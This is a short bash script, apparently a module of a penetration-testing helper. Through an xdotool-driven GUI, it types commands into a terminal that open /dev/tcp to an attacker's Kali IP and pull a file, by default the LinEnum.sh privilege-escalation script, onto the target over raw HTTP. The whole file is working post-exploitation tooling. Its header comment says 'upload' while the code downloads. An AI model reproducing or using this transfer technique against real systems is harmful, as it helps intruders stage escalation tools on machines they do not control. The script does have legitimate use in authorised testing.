#!/bin/bash

: '
upload file to upload server (only works if enable-net-redirections is enabled)
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
FILE_TO_DOWNLOAD_FIELD=$(form_item "file to download" "file_to_download" "/LinEnum.sh")

# Generate GUI form
generate_form "${FILE_TO_DOWNLOAD_FIELD}" 

FILE_TO_DOWNLOAD=${form_data["file_to_download"]}

paste_command "# make sure a server is running in another window; python3 -m http.server 80"
xdotool key Return
sleep 0.8

paste_command "exec 3<>/dev/tcp/${KALI_IP}/80"
xdotool key Return
sleep 1

paste_command "echo -e \"GET ${FILE_TO_DOWNLOAD} HTTP/1.1\n\n\">&3"
xdotool key Return
sleep 1

paste_command "cat <&3"
xdotool key Return
sleep 1
